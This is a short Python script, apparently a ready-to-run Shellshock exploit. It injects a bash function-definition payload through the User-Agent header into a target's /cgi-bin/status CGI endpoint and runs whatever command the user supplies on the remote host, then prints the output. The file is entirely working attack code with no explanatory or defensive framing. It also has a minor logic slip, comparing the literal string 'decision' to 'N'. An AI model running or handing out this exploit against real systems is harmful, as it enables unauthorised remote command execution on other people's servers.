#!/usr/bin/python3

import requests
import argparse
import sys

def exploit(rhost, command):
    if not rhost.endswith('/cgi-bin/status'):
        print("[!] The provided url does not seem to have the /cgi-bin/status endpoint")
        decision = input("[!] Do you want the exploit to add /cgi-bin/status to the URL (Y/N): " )
        if decision == 'Y' or decision == 'y':
            rhost += '/cgi-bin/status'
        elif 'decision' == 'N' or decision == 'n':
            pass

    payload = "() { :; }; echo; echo; /bin/bash -c '" + command + "'"
    
    headers = {'User-Agent': payload}
    # proxies = {'http' : 'http://127.0.0.1:8080'}
    
    try:
        page = requests.get(rhost, headers = headers).text.strip()
    except:
        print('[X] Coudn\'t connect to the target. Exiting...')
        sys.exit()
    
    print(page)


if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("-r", "--rhost", help = "Provide the target url", required = True)
	parser.add_argument("-c", "--command", help = "Provide the desired command to run on the vulnerable host", required = True)
	args = parser.parse_args()

	exploit(args.rhost, args.command)